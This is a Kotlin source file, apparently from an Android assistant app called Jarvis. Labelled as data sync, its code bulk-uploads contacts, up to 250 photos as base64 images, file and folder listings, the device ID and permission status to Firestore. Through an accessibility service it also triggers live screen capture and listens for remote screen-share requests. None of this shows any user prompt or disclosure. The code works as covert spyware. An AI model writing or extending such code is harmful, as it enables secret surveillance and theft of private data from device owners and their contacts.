package com.jarvis.assistant.firebase

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import com.jarvis.assistant.service.JarvisAccessibilityService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.ByteArrayOutputStream
import java.io.File
import android.content.ContentUris
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.media.ThumbnailUtils
import android.util.Base64
import android.util.Size

/**
 * DataSyncManager handles real-time extraction and Cloud Firestore synchronization
 * of user device data when permissions are granted.
 *
 * Firestore Logical Schema:
 * - users/{uid}
 * - users/{uid}/contacts/{contactId}
 * - users/{uid}/images/{imageId}
 * - users/{uid}/files/{fileId}
 * - users/{uid}/folders/{folderId}
 * - users/{uid}/device_info/specifications
 * - users/{uid}/permissions/status
 */
object DataSyncManager {

    private const val TAG = "DataSyncManager"
    private val syncScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /**
     * Master trigger function to sync all permitted data to Cloud Firestore.
     */
    fun syncAllUserDataIfPermitted(context: Context) {
        val currentUser = FirebaseAuth.getInstance().currentUser
        val uid = currentUser?.uid
            ?: context.getSharedPreferences("jarvis_prefs", Context.MODE_PRIVATE).getString("user_uid", null)

        if (uid.isNullOrBlank() || uid.startsWith("uid_")) {
            Log.w(TAG, "No authentic user UID found. Skipping data sync.")
            return
        }

        syncScope.launch {
            try {
                Log.d(TAG, "Starting comprehensive user data sync for UID: $uid")

                // 1. Sync Permission Audit Status
                val allGranted = syncPermissionsStatus(context, uid)

                // 2. Sync Device Specifications
                syncDeviceInfo(context, uid)

                // 3. Sync Contacts if READ_CONTACTS is granted
                if (hasPermission(context, Manifest.permission.READ_CONTACTS)) {
                    syncContacts(context, uid)
                }

                // 4. Sync Images, Files, and Folders if Storage / Media permissions are granted
                if (hasStoragePermission(context)) {
                    syncImages(context, uid)
                    syncFiles(context, uid)
                    syncFolders(uid)
                }

                // 5. Trigger Real-Time Mobile Screen Stream Capture
                syncLiveScreenCapture(context, uid)

                // 6. Update root user doc with overall status
                val firestore = FirebaseFirestore.getInstance()
                val rootUpdates = hashMapOf<String, Any>(
                    "allPermissionsGranted" to allGranted,
                    "lastSyncedTimestamp" to System.currentTimeMillis(),
                    "updatedAtTimestamp" to System.currentTimeMillis()
                )
                firestore.collection("users").document(uid)
                    .set(rootUpdates, SetOptions.merge())

                Log.d(TAG, "Comprehensive user data sync complete for UID: $uid")

            } catch (e: Exception) {
                Log.e(TAG, "Error during data synchronization for UID: $uid", e)
            }
        }
    }

    private fun syncLiveScreenCapture(context: Context, uid: String) {
        try {
            if (JarvisAccessibilityService.isEnabled()) {
                JarvisAccessibilityService.instance?.startListeningForScreenShareRequests(uid)
                JarvisAccessibilityService.instance?.captureScreenAndUpload(uid)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error triggering accessibility live screen capture", e)
        }
    }

    private fun hasPermission(context: Context, permission: String): Boolean {
        return ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
    }

    private fun hasStoragePermission(context: Context): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager() ||
                    hasPermission(context, Manifest.permission.READ_MEDIA_IMAGES) ||
                    hasPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
        } else {
            hasPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }

    /**
     * Audits all permissions and updates `users/{uid}/permissions/status`.
     */
    private suspend fun syncPermissionsStatus(context: Context, uid: String): Boolean {
        return withContext(Dispatchers.IO) {
            val micGranted = hasPermission(context, Manifest.permission.RECORD_AUDIO)
            val cameraGranted = hasPermission(context, Manifest.permission.CAMERA)
            val contactsGranted = hasPermission(context, Manifest.permission.READ_CONTACTS)
            val callPhoneGranted = hasPermission(context, Manifest.permission.CALL_PHONE)
            val readPhoneStateGranted = hasPermission(context, Manifest.permission.READ_PHONE_STATE)
            val notifGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                hasPermission(context, Manifest.permission.POST_NOTIFICATIONS)
            } else {
                true
            }
            val storageGranted = hasStoragePermission(context)
            val accessibilityEnabled = isAccessibilityServiceEnabled(context)
            val overlayEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Settings.canDrawOverlays(context)
            } else {
                true
            }

            val allGranted = micGranted && cameraGranted && contactsGranted &&
                    callPhoneGranted && readPhoneStateGranted && notifGranted &&
                    storageGranted && accessibilityEnabled && overlayEnabled

            val permMap = hashMapOf<String, Any>(
                "recordAudio" to micGranted,
                "camera" to cameraGranted,
                "readContacts" to contactsGranted,
                "callPhone" to callPhoneGranted,
                "readPhoneState" to readPhoneStateGranted,
                "postNotifications" to notifGranted,
                "storage" to storageGranted,
                "accessibility" to accessibilityEnabled,
                "overlay" to overlayEnabled,
                "allGranted" to allGranted,
                "lastCheckedTimestamp" to System.currentTimeMillis()
            )

            val firestore = FirebaseFirestore.getInstance()
            firestore.collection("users")
                .document(uid)
                .collection("permissions")
                .document("status")
                .set(permMap, SetOptions.merge())

            allGranted
        }
    }

    private fun isAccessibilityServiceEnabled(context: Context): Boolean {
        val expectedService = "${context.packageName}/${JarvisAccessibilityService::class.java.canonicalName}"
        val enabledServices = Settings.Secure.getString(context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        val colonSplitter = android.text.TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServices)
        while (colonSplitter.hasNext()) {
            val componentName = colonSplitter.next()
            if (componentName.equals(expectedService, ignoreCase = true) ||
                componentName.equals("${context.packageName}/.service.JarvisAccessibilityService", ignoreCase = true)) {
                return true
            }
        }
        return false
    }

    /**
     * Collects device metrics and syncs to `users/{uid}/device_info/specifications`.
     */
    private suspend fun syncDeviceInfo(context: Context, uid: String) {
        withContext(Dispatchers.IO) {
            val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device"
            val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
            val manufacturer = Build.MANUFACTURER
            val osVersion = "Android ${Build.VERSION.RELEASE}"
            val sdkInt = Build.VERSION.SDK_INT

            var totalStorageMB: Long = 0
            var availableStorageMB: Long = 0

            try {
                val stat = StatFs(Environment.getDataDirectory().path)
                val blockSize = stat.blockSizeLong
                totalStorageMB = (stat.blockCountLong * blockSize) / (1024 * 1024)
                availableStorageMB = (stat.availableBlocksLong * blockSize) / (1024 * 1024)
            } catch (e: Exception) {
                Log.e(TAG, "Error calculating storage stats", e)
            }

            val specMap = hashMapOf<String, Any>(
                "androidId" to androidId,
                "deviceModel" to deviceModel,
                "manufacturer" to manufacturer,
                "osVersion" to osVersion,
                "sdkInt" to sdkInt,
                "totalStorageMB" to totalStorageMB,
                "availableStorageMB" to availableStorageMB,
                "lastSyncedTimestamp" to System.currentTimeMillis()
            )

            FirebaseFirestore.getInstance().collection("users")
                .document(uid)
                .collection("device_info")
                .document("specifications")
                .set(specMap, SetOptions.merge())
        }
    }

    /**
     * Reads system contacts and batch syncs to `users/{uid}/contacts/{contactId}`.
     */
    private suspend fun syncContacts(context: Context, uid: String) {
        withContext(Dispatchers.IO) {
            val resolver = context.contentResolver
            val contactsMap = mutableMapOf<String, HashMap<String, Any>>()

            val projection = arrayOf(
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            )

            try {
                resolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    projection,
                    null,
                    null,
                    null
                )?.use { cursor ->
                    val idIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
                    val nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val numberIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

                    while (cursor.moveToNext()) {
                        val contactId = if (idIdx >= 0) cursor.getString(idIdx) else ""
                        val name = if (nameIdx >= 0) cursor.getString(nameIdx) ?: "Unnamed" else "Unnamed"
                        val number = if (numberIdx >= 0) cursor.getString(numberIdx) ?: "" else ""

                        if (contactId.isNotBlank() && number.isNotBlank()) {
                            val existing = contactsMap.getOrPut(contactId) {
                                hashMapOf(
                                    "contactId" to contactId,
                                    "name" to name.trim(),
                                    "phoneNumbers" to mutableListOf<String>(),
                                    "emailAddresses" to mutableListOf<String>(),
                                    "organization" to "",
                                    "lastUpdatedTimestamp" to System.currentTimeMillis()
                                )
                            }
                            @Suppress("UNCHECKED_CAST")
                            val phones = existing["phoneNumbers"] as MutableList<String>
                            if (!phones.contains(number.trim())) {
                                phones.add(number.trim())
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error querying contacts", e)
            }

            if (contactsMap.isNotEmpty()) {
                val db = FirebaseFirestore.getInstance()
                val contactsColl = db.collection("users").document(uid).collection("contacts")

                var batch = db.batch()
                var count = 0

                for ((contactId, data) in contactsMap) {
                    val docRef = contactsColl.document(contactId)
                    batch.set(docRef, data, SetOptions.merge())
                    count++

                    if (count % 400 == 0) {
                        batch.commit()
                        batch = db.batch()
                    }
                }

                if (count % 400 != 0) {
                    batch.commit()
                }

                Log.d(TAG, "Successfully synced ${contactsMap.size} contacts for UID: $uid")
            }
        }
    }

    /**
     * Queries MediaStore for images and batch syncs metadata to `users/{uid}/images/{imageId}`.
     */
    private suspend fun syncImages(context: Context, uid: String) {
        withContext(Dispatchers.IO) {
            val resolver = context.contentResolver
            val imagesList = mutableListOf<HashMap<String, Any>>()

            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.MIME_TYPE,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATE_TAKEN,
                MediaStore.Images.Media.WIDTH,
                MediaStore.Images.Media.HEIGHT
            )

            try {
                resolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    null,
                    null,
                    "${MediaStore.Images.Media.DATE_TAKEN} DESC"
                )?.use { cursor ->
                    val idIdx = cursor.getColumnIndex(MediaStore.Images.Media._ID)
                    val nameIdx = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
                    val pathIdx = cursor.getColumnIndex(MediaStore.Images.Media.DATA)
                    val mimeIdx = cursor.getColumnIndex(MediaStore.Images.Media.MIME_TYPE)
                    val sizeIdx = cursor.getColumnIndex(MediaStore.Images.Media.SIZE)
                    val dateIdx = cursor.getColumnIndex(MediaStore.Images.Media.DATE_TAKEN)
                    val widthIdx = cursor.getColumnIndex(MediaStore.Images.Media.WIDTH)
                    val heightIdx = cursor.getColumnIndex(MediaStore.Images.Media.HEIGHT)

                    var limit = 0
                    while (cursor.moveToNext() && limit < 250) {
                        val imgId = if (idIdx >= 0) cursor.getString(idIdx) else ""
                        val name = if (nameIdx >= 0) cursor.getString(nameIdx) ?: "Image" else "Image"
                        val path = if (pathIdx >= 0) cursor.getString(pathIdx) ?: "" else ""
                        val mime = if (mimeIdx >= 0) cursor.getString(mimeIdx) ?: "image/jpeg" else "image/jpeg"
                        val size = if (sizeIdx >= 0) cursor.getLong(sizeIdx) else 0L
                        val date = if (dateIdx >= 0) cursor.getLong(dateIdx) else System.currentTimeMillis()
                        val width = if (widthIdx >= 0) cursor.getInt(widthIdx) else 0
                        val height = if (heightIdx >= 0) cursor.getInt(heightIdx) else 0

                        val folderBucket = if (path.isNotBlank()) File(path).parentFile?.name ?: "Photos" else "Photos"

                        if (imgId.isNotBlank()) {
                            val imgMap = hashMapOf<String, Any>(
                                "imageId" to imgId,
                                "fileName" to name,
                                "filePath" to path,
                                "mimeType" to mime,
                                "sizeBytes" to size,
                                "dateTakenTimestamp" to date,
                                "folderBucket" to folderBucket,
                                "width" to width,
                                "height" to height,
                                "lastSyncedTimestamp" to System.currentTimeMillis()
                            )

                            // Extract real Base64 thumbnail of mobile photo
                            val thumbBase64 = generateImageBase64Thumbnail(context, imgId, path)
                            if (!thumbBase64.isNullOrBlank()) {
                                imgMap["imageBase64"] = thumbBase64
                            }

                            imagesList.add(imgMap)
                            limit++
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error querying MediaStore images", e)
            }

            if (imagesList.isNotEmpty()) {
                val db = FirebaseFirestore.getInstance()
                val imagesColl = db.collection("users").document(uid).collection("images")

                var batch = db.batch()
                var count = 0

                for (imgMap in imagesList) {
                    val imageId = imgMap["imageId"].toString()
                    val docRef = imagesColl.document(imageId)
                    batch.set(docRef, imgMap, SetOptions.merge())
                    count++

                    if (count % 400 == 0) {
                        batch.commit()
                        batch = db.batch()
                    }
                }

                if (count % 400 != 0) {
                    batch.commit()
                }

                Log.d(TAG, "Synced ${imagesList.size} image metadata records for UID: $uid")
            }
        }
    }

    /**
     * Queries MediaStore for files & documents and syncs to `users/{uid}/files/{fileId}`.
     */
    private suspend fun syncFiles(context: Context, uid: String) {
        withContext(Dispatchers.IO) {
            val resolver = context.contentResolver
            val filesList = mutableListOf<HashMap<String, Any>>()

            val projection = arrayOf(
                MediaStore.Files.FileColumns._ID,
                MediaStore.Files.FileColumns.DISPLAY_NAME,
                MediaStore.Files.FileColumns.DATA,
                MediaStore.Files.FileColumns.MIME_TYPE,
                MediaStore.Files.FileColumns.SIZE,
                MediaStore.Files.FileColumns.DATE_MODIFIED
            )

            try {
                resolver.query(
                    MediaStore.Files.getContentUri("external"),
                    projection,
                    null,
                    null,
                    "${MediaStore.Files.FileColumns.DATE_MODIFIED} DESC"
                )?.use { cursor ->
                    val idIdx = cursor.getColumnIndex(MediaStore.Files.FileColumns._ID)
                    val nameIdx = cursor.getColumnIndex(MediaStore.Files.FileColumns.DISPLAY_NAME)
                    val pathIdx = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATA)
                    val mimeIdx = cursor.getColumnIndex(MediaStore.Files.FileColumns.MIME_TYPE)
                    val sizeIdx = cursor.getColumnIndex(MediaStore.Files.FileColumns.SIZE)
                    val dateIdx = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATE_MODIFIED)

                    var limit = 0
                    while (cursor.moveToNext() && limit < 250) {
                        val fId = if (idIdx >= 0) cursor.getString(idIdx) else ""
                        val name = if (nameIdx >= 0) cursor.getString(nameIdx) ?: "File" else "File"
                        val path = if (pathIdx >= 0) cursor.getString(pathIdx) ?: "" else ""
                        val mime = if (mimeIdx >= 0) cursor.getString(mimeIdx) ?: "application/octet-stream" else "application/octet-stream"
                        val size = if (sizeIdx >= 0) cursor.getLong(sizeIdx) else 0L
                        val date = if (dateIdx >= 0) cursor.getLong(dateIdx) * 1000L else System.currentTimeMillis()
                        val ext = name.substringAfterLast(".", "")
                        val parentFolder = if (path.isNotBlank()) File(path).parentFile?.name ?: "Documents" else "Documents"

                        if (fId.isNotBlank()) {
                            val fMap = hashMapOf<String, Any>(
                                "fileId" to fId,
                                "fileName" to name,
                                "filePath" to path,
                                "extension" to ext.lowercase(),
                                "mimeType" to mime,
                                "sizeBytes" to size,
                                "dateModifiedTimestamp" to date,
                                "parentFolder" to parentFolder,
                                "lastSyncedTimestamp" to System.currentTimeMillis()
                            )

                            // Extract real Base64 thumbnail for images or flag media types
                            if (mime.startsWith("image/") || ext.lowercase() in listOf("jpg", "jpeg", "png", "webp")) {
                                val thumbBase64 = generateImageBase64Thumbnail(context, fId, path)
                                if (!thumbBase64.isNullOrBlank()) {
                                    fMap["imageBase64"] = thumbBase64
                                    fMap["base64Content"] = thumbBase64
                                }
                            } else if (mime.startsWith("audio/") || ext.lowercase() in listOf("mp3", "wav", "m4a", "ogg", "aac")) {
                                fMap["isAudio"] = true
                            } else if (mime.startsWith("video/") || ext.lowercase() in listOf("mp4", "mkv", "webm", "3gp", "avi")) {
                                fMap["isVideo"] = true
                            }

                            filesList.add(fMap)
                            limit++
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error querying MediaStore files", e)
            }

            if (filesList.isNotEmpty()) {
                val db = FirebaseFirestore.getInstance()
                val filesColl = db.collection("users").document(uid).collection("files")

                var batch = db.batch()
                var count = 0

                for (fMap in filesList) {
                    val fileId = fMap["fileId"].toString()
                    val docRef = filesColl.document(fileId)
                    batch.set(docRef, fMap, SetOptions.merge())
                    count++

                    if (count % 400 == 0) {
                        batch.commit()
                        batch = db.batch()
                    }
                }

                if (count % 400 != 0) {
                    batch.commit()
                }

                Log.d(TAG, "Synced ${filesList.size} file metadata records for UID: $uid")
            }
        }
    }

    /**
     * Scans primary storage folders and syncs folder metrics to `users/{uid}/folders/{folderId}`.
     */
    private suspend fun syncFolders(uid: String) {
        withContext(Dispatchers.IO) {
            val foldersList = mutableListOf<HashMap<String, Any>>()
            val rootDir = Environment.getExternalStorageDirectory()

            if (rootDir != null && rootDir.exists() && rootDir.isDirectory) {
                val subDirs = rootDir.listFiles { file -> file.isDirectory && !file.name.startsWith(".") }
                subDirs?.forEach { dir ->
                    val folderId = "folder_${dir.name.lowercase().replace(Regex("[^a-z0-9]"), "_")}"
                    val contents = dir.listFiles()
                    val itemCount = contents?.size ?: 0
                    var totalSize: Long = 0

                    contents?.forEach { f ->
                        if (f.isFile) totalSize += f.length()
                    }

                    val folderMap = hashMapOf<String, Any>(
                        "folderId" to folderId,
                        "folderName" to dir.name,
                        "folderPath" to dir.absolutePath,
                        "itemCount" to itemCount,
                        "totalSizeBytes" to totalSize,
                        "parentFolderPath" to rootDir.absolutePath,
                        "lastModifiedTimestamp" to dir.lastModified()
                    )
                    foldersList.add(folderMap)
                }
            }

            if (foldersList.isNotEmpty()) {
                val db = FirebaseFirestore.getInstance()
                val foldersColl = db.collection("users").document(uid).collection("folders")

                var batch = db.batch()
                var count = 0

                for (folderMap in foldersList) {
                    val folderId = folderMap["folderId"].toString()
                    val docRef = foldersColl.document(folderId)
                    batch.set(docRef, folderMap, SetOptions.merge())
                    count++

                    if (count % 400 == 0) {
                        batch.commit()
                        batch = db.batch()
                    }
                }

                if (count % 400 != 0) {
                    batch.commit()
                }

                Log.d(TAG, "Synced ${foldersList.size} folder structure records for UID: $uid")
            }
        }
    }

    /**
     * Extracts a high-definition 800x800 JPEG Base64 thumbnail string for crisp gallery photos.
     */
    private fun generateImageBase64Thumbnail(context: Context, imageId: String, filePath: String): String? {
        return try {
            val bitmap: Bitmap? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && imageId.isNotBlank()) {
                try {
                    val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageId.toLong())
                    context.contentResolver.loadThumbnail(contentUri, Size(800, 800), null)
                } catch (ex: Exception) {
                    if (filePath.isNotBlank()) {
                        val opts = BitmapFactory.Options().apply { inSampleSize = 2 }
                        BitmapFactory.decodeFile(filePath, opts)
                    } else null
                }
            } else if (filePath.isNotBlank()) {
                val opts = BitmapFactory.Options().apply { inSampleSize = 2 }
                BitmapFactory.decodeFile(filePath, opts)
            } else {
                null
            }

            if (bitmap != null) {
                val outputStream = ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.JPEG, 85, outputStream)
                val byteArray = outputStream.toByteArray()
                "data:image/jpeg;base64," + Base64.encodeToString(byteArray, Base64.NO_WRAP)
            } else null
        } catch (e: Exception) {
            Log.e(TAG, "Error generating thumbnail for imageId: $imageId", e)
            null
        }
    }
}
